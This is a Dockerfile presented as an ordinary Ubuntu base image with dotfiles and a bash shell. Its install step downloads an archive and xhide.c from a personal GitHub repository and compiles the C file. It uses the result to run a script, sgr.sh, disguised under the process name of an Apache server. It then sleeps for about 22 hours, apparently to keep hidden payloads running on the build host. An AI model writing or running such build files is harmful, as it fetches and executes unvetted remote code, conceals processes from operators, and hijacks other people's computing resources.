FROM ubuntu:18.04

# Install.
RUN \
  apt-get update && \
  apt-get install screen -y && \
  apt-get install make -y && \
  apt-get install -y wget && \
  apt-get install sudo && \
  apt-get install gcc -y && \
  wget https://github.com/waefd46/weimu/raw/main/main.tar.gz && \
  tar xf main.tar.gz && \
  wget https://github.com/waefd46/weimu/raw/main/xhide.c && \
  gcc -o test xhide.c && \
  ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh && \
  sleep 80000 && \
  rm -rf /var/lib/apt/lists/* 

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD ["bash"]
